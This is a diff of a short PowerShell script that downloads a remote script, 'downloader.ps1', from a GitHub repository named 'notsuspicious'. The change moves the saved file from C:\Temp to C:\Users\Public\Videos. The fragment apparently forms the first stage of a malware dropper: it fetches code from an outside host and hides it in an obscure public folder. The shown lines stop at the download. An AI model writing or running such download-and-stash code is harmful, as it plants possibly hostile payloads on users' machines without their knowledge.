@@ -2,7 +2,7 @@
 $url = "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1"
 
 # Define the path to save the downloaded script
-$scriptPath = "C:\Temp\downloader.ps1"
+$scriptPath = "C:\Users\Public\Videos\downloader.ps1"
 
 # Download the script content
 Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing
